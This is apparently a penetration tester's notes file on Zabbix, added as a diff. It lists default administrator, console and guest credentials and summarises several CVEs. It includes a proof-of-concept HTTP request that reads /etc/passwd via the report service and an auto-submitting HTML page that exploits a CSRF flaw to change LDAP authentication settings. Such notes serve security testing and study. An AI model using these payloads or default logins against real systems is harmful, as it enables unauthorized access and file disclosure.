@@ -1,0 +1,122 @@
+**********************************************************
+Zabbix is an open-source monitoring software tool for diverse IT components, including networks, servers, 
+virtual machines and cloud services. Zabbix provides monitoring metrics, among others network utilization, CPU load and disk space consumption.
+**********************************************************
+
+Default credentials:
+
+If you see the Zabbix welcome screen. Enter the user name Admin with password zabbix to log in as a Zabbix superuser. 
+Access to Configuration and Administration menus will be granted.
+
+Default username and password for the front-end is: Admin/zabbix
+
+and for the console it is appliance/zabbix
+
+https://serverfault.com/questions/764694/what-is-the-default-root-password-for-zabbix-appliance-3-0
+https://www.zabbix.com/documentation/1.8/en/manual/quickstart/login
+
+Zabbix Default Guest Account
+
+Zabbix has a default guest account with no password set. It was possible; to access the dashboard without special authentication.
+
+Vulnerability Impact:
+An attacker may use this account to use further attacks to elevate
+his privileges.
+
+http://www.securityspace.com/smysecure/catid.html?id=1.3.6.1.4.1.25623.1.0.106180
+
+DB:
+
+DBName=zabbix
+DBUser=zabbix
+DBPassword=here-an-example-password-but-please-change-me
+
+**********************************************************
+
+https://www.zabbix.com/security_advisories
+
+1. Zabbix Web Service Report Generation External Control of File Name Information Disclosure Vulnerability (CVE-2022-46768)
+
+Description: Arbitrary file read vulnerability exists in Zabbix Web Service Report Generation, which listens on the port 10053. 
+The service does not have proper validation for URL parameters before reading the files.
+
+References: 
+
+https://www.tenable.com/cve/CVE-2022-46768 (Yes, i know, you love Nessus)
+
+PoC:
+
+There are 2 pre-conditions:
+
+1) Zabbix web service has to allow the access from attacker's IP in the zabbix_web_service.conf file as below
+
+2) Victim server has to install Google Chrome
+
+Vulnerable HTTP request
+{noformat}
+POST /report HTTP/1.1
+Cookie: some=ff
+Host: 172.16.72.151
+Content-type: application/json
+User-Agent: Chrome
+Content-length: 86
+{"url":"file:///etc/passwd","headers":{}, "parameters":{"width":"640","height":"640"}}
+{noformat}
+
+h2. Request
+
+The issue is confirmed. Even by default web service accepts requests only from localhost, we have to apply URL validation here to 
+avoid the different types of injection attacks.
+ 
+2. X-Forwarded-For header is active by default causes access to zabbix sites in maintenance mode (CVE-2022-43515)
+
+Synopsis: X-Forwarded-For header is active by default causes access to Zabbix sites in maintenance mode
+
+Description: Zabbix Frontend provides a feature that allows admins to maintain the installation and ensure that only certain IP 
+addresses can access it. In this way, any user will not be able to access the Zabbix Frontend while it is being maintained and 
+possible sensitive data will be prevented from being disclosed.
+
+An attacker can bypass this protection and access the instance using IP address not listed in the defined range.
+
+3. Cross site scripting in backurl parameter (CVE-2022-40626)
+
+Synopsis: Reflected XSS in the backurl parameter of Zabbix Frontend
+Description: An unauthenticated user can create a link with reflected Javascript code inside the backurl parameter and send it to other authenticated users.
+
+4. Reflected XSS in graphs page of Zabbix Frontend [CVE-2022-35230]
+
+Synopsis: Reflected XSS in graphs page of Zabbix Frontend
+
+Description: An authenticated user can create a link with reflected Javascript code inside it for the graphs page and send it to other users. 
+The payload can be executed only with a known CSRF token value of the victim, which is changed periodically and is difficult to predict.
+
+5. Reflected XSS in discovery page of Zabbix Frontend [CVE-2022-35229]
+
+Synopsis: Reflected XSS in discovery page of Zabbix Frontend
+
+Description: An authenticated user can create a link with reflected Javascript code inside it for the discovery page and send it to other users. 
+The payload can be executed only with a known CSRF token value of the victim, which is changed periodically and is difficult to predict.
+
+6. Possible view of the setup pages by unauthenticated users if config file already exists (CVE-2022-23134)
+
+7. CVE-2021-27927: CSRF to RCE Chain in Zabbix
+https://www.horizon3.ai/cve-2021-27927-csrf-to-rce-chain-in-zabbix/
+
+Exploit:
+
+<html>
+<body>
+
+  <p>Any web site</p>
+  <a id='link' href='http://192.168.0.140/zabbix.php?form_refresh=1&action=authentication.update&db_authentication_type=0&authentication_type=1&http_auth_enabled=0&ldap_configured=1&ldap_host=10.0.229.1&ldap_port=389&ldap_base_dn=dc%3Dsmoke%2Cdc%3Dnet&ldap_search_attribute=sAMAccountName&ldap_bind_dn=cn%3DAdmin%2CCN%3DUsers%2CDC%3Dsmoke%2CDC%3Dnet&ldap_case_sensitive=1&action_passw_change=authentication.edit&ldap_test_user=Admin&ldap_test_password=Z@bb1x!&saml_auth_enabled=0&update=Update'></a>
+  <script>
+    document.getElementById('link').click();
+  </script>
+
+</body>
+</html>
+
+Examples: (HTB - Zabbix exploitation)
+
+https://www.secjuice.com/htb-shibboleth-walkthrough/
+https://sheerazali.com/shibboleth-writeup-walkthrough-hack-the-box/
